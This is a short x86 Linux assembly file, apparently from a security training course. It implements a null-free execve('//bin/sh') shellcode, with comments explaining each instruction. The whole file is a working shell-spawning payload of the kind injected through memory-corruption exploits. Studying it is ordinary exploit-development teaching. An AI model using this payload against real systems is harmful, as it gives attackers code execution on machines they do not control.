; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;

global _start		

section .text
_start:

	; PUSH 0x00000000 on the Stack

	xor eax, eax
	push eax

	; PUSH //bin/sh in reverse i.e. hs/nib//

	push 0x68732f6e
	push 0x69622f2f

	; Make EBX point to //bin/sh on the Stack using ESP

	mov ebx, esp

	; PUSH 0x00000000 using EAX and point EDX to it using ESP

	push eax
	mov edx, esp 

	; PUSH Address of //bin/sh on the Stack and make ECX point to it using ESP

	push ebx
	mov ecx, esp

	; EAX = 0, Let's move 11 into AL to avoid nulls in the Shellcode

	mov al, 11
	int 0x80

